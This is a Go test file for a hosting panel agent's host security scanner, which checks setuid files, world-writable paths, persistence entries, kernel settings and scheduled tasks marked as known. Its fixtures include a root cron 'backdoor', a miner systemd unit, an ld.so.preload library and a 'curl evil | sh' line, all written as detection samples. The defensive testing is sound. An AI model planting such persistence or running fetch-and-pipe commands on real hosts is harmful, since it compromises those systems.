package security

import (
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mchkhawarshahzad/whacp/agent/internal/platform"
	"github.com/mchkhawarshahzad/whacp/agent/internal/testhost"
)

func init() { hostScanEnabled = false }

func TestHostScanFindings(t *testing.T) {
	h := testhost.New(t)
	put := func(p string, mode os.FileMode, body string) {
		full := filepath.Join(h.Base, p)
		os.MkdirAll(filepath.Dir(full), 0o755)
		os.WriteFile(full, []byte(body), 0o644)
		os.Chmod(full, mode)
	}
	put("usr/bin/passwd", 0o755|os.ModeSetuid, "x")            // a package's
	put("usr/local/bin/rootme", 0o755|os.ModeSetuid, "x")      // no package
	put("tmp/.x/sh", 0o755|os.ModeSetgid, "x")                 // untrusted place
	put("etc/open.conf", 0o666, "x")                           // world-writable
	put("home/whacp/shop.test/public_html/up.txt", 0o666, "x") // a website's own: not reported
	os.MkdirAll(filepath.Join(h.Base, "var/lib/shared"), 0o777)
	os.Chmod(filepath.Join(h.Base, "var/lib/shared"), 0o777|os.ModeSticky) // sticky: fine
	// A server's socket must be connectable: not reported (mysql.sock).
	os.MkdirAll(filepath.Join(h.Base, "var/lib/mysql"), 0o755)
	if l, err := net.Listen("unix", filepath.Join(h.Base, "var/lib/mysql/mysql.sock")); err == nil {
		defer l.Close()
		os.Chmod(filepath.Join(h.Base, "var/lib/mysql/mysql.sock"), 0o777)
	} else {
		t.Logf("no socket: %v", err)
	}
	put("etc/cron.d/backdoor", 0o644, "* * * * * root /tmp/x\n")
	put("etc/cron.d/sysstat", 0o644, "x")                                           // a package's
	put("etc/cron.d/whacp-websites", 0o644, "# Managed by WhaCP\n")                 // WhaCP's
	put("etc/systemd/system/miner.service", 0o644, "[Service]\nExecStart=/tmp/m\n") // not a package's
	put("etc/ld.so.preload", 0o644, "/lib/evil.so\n")
	owned := map[string]bool{"/bin/passwd": true, "/etc/cron.d/sysstat": true, "/etc/cron.d/certbot": true} // merged-/usr spelling

	r := Scan(t.Context(), h.Env, owned, time.Now())
	paths := func(fs []Finding) string {
		var l []string
		for _, f := range fs {
			l = append(l, f.Path)
		}
		return strings.Join(l, " ")
	}
	if got := paths(r.Setuid); got != "/tmp/.x/sh /usr/local/bin/rootme" {
		t.Errorf("setuid: %q", got)
	}
	if got := paths(r.Writable); got != "/etc/open.conf" {
		t.Errorf("writable: %q", got)
	}
	if got := paths(r.Persist); got != "/etc/cron.d/backdoor /etc/ld.so.preload /etc/systemd/system/miner.service /var/spool/cron/crontabs/deploy" {
		t.Errorf("persistence: %q", got)
	}
	checks := map[string]Check{}
	for _, c := range hostScanChecks(h.Env, &r, false) {
		checks[c.ID] = c
	}
	if checks["host_setuid"].Status != "fail" || checks["host_world_writable"].Status != "warn" || checks["host_persistence"].Status != "warn" || checks["host_capabilities"].Status != "pass" {
		t.Errorf("checks: %+v", checks)
	}
	// A finding fixed since the scan (or wrongly reported by an older
	// scan, such as a socket) is not listed until the next scan.
	os.Chmod(filepath.Join(h.Base, "etc/open.conf"), 0o644)
	stale := r
	stale.Writable = append(stale.Writable, Finding{Path: "/var/lib/mysql/mysql.sock"})
	for _, c := range hostScanChecks(h.Env, &stale, false) {
		if c.ID == "host_world_writable" && c.Status != "pass" {
			t.Errorf("fixed or socket still listed: %+v", c)
		}
	}
	if c := hostScanChecks(nil, nil, true); len(c) != 1 || c[0].Status != "info" {
		t.Errorf("no scan yet: %+v", c)
	}
}

func TestSysctlCheck(t *testing.T) {
	h := testhost.New(t)
	set := func(k, v string) {
		p := filepath.Join(h.Base, "proc/sys", strings.ReplaceAll(k, ".", "/"))
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(v+"\n"), 0o644)
	}
	for _, s := range kernelSettings {
		set(s.key, s.value)
	}
	if c := sysctlCheck(h.Env); c.Status != "pass" {
		t.Fatalf("all good: %+v", c)
	}
	set("fs.protected_symlinks", "0")
	set("kernel.yama.ptrace_scope", "0")
	c := sysctlCheck(h.Env)
	if c.Status != "warn" || !strings.Contains(c.Detail, "fs.protected_symlinks = 0") || !strings.Contains(c.Remedy, "kernel.yama.ptrace_scope = 1") || !strings.Contains(c.Detail, "debuggers") {
		t.Errorf("%+v", c)
	}
}

// RHEL: the package file list comes from rpm (seen on AlmaLinux: a query
// format with a real line break was refused by the agent, the list stayed
// empty).
func TestOwnedFilesRPM(t *testing.T) {
	h := testhost.New(t)
	os.WriteFile(filepath.Join(h.Base, "etc/os-release"), []byte("ID=\"almalinux\"\nVERSION_ID=\"9.8\"\n"), 0o644)
	h.Env.Platform = platform.Detect(h.Env.Root)
	h.Respond = func(id string, a []string) (string, error, bool) {
		if id == "rpm" {
			return "/usr/bin/passwd\n/usr/bin/su\n", nil, true
		}
		return "", nil, false
	}
	owned, err := OwnedFiles(t.Context(), h.Env)
	if err != nil || !owned["/usr/bin/passwd"] || len(owned) != 2 {
		t.Fatalf("%v %v", owned, err)
	}
}

// Scheduled tasks marked as known stop being reported until they change.
func TestPersistMarkedKnown(t *testing.T) {
	h := testhost.New(t)
	os.MkdirAll(filepath.Join(h.Base, "etc/cron.hourly"), 0o755)
	os.MkdirAll(filepath.Join(h.Base, h.Env.Cfg.StateDir), 0o700)
	os.WriteFile(filepath.Join(h.Base, "etc/cron.hourly/fstrim"), []byte("fstrim -a\n"), 0o755)
	os.WriteFile(filepath.Join(h.Base, "etc/cron.hourly/free"), []byte("free\n"), 0o755)
	r := Scan(t.Context(), h.Env, map[string]bool{}, time.Now())
	scanner.mu.Lock()
	saved := scanner.latest
	scanner.latest = &r
	scanner.mu.Unlock()
	defer func() { scanner.mu.Lock(); scanner.latest = saved; scanner.mu.Unlock() }()
	check := func() Check {
		for _, c := range hostScanChecks(h.Env, &r, false) {
			if c.ID == "host_persistence" {
				return c
			}
		}
		t.Fatal("no host_persistence check")
		return Check{}
	}
	if c := check(); c.Status == "pass" || c.Fix != "apply" || !strings.Contains(c.Detail, "/etc/cron.hourly/fstrim") {
		t.Fatalf("before: %+v", c)
	}
	marked, err := MarkPersistKnown(h.Env, false)
	if err != nil || len(marked) < 2 {
		t.Fatalf("marked %v, %v", marked, err)
	}
	if c := check(); c.Status != "pass" || c.Fix != "undo" || !strings.Contains(c.Detail, "marked as known") {
		t.Fatalf("after marking: %+v", c)
	}
	// Changed since: reported again.
	os.WriteFile(filepath.Join(h.Base, "etc/cron.hourly/free"), []byte("curl evil | sh\n"), 0o755)
	if c := check(); c.Status == "pass" || !strings.Contains(c.Detail, "/etc/cron.hourly/free") || strings.Contains(c.Detail, "fstrim") {
		t.Fatalf("changed file not reported again: %+v", c)
	}
	if _, err := MarkPersistKnown(h.Env, true); err != nil {
		t.Fatal(err)
	}
	if c := check(); !strings.Contains(c.Detail, "fstrim") {
		t.Fatalf("forgetting kept the marks: %+v", c)
	}
}
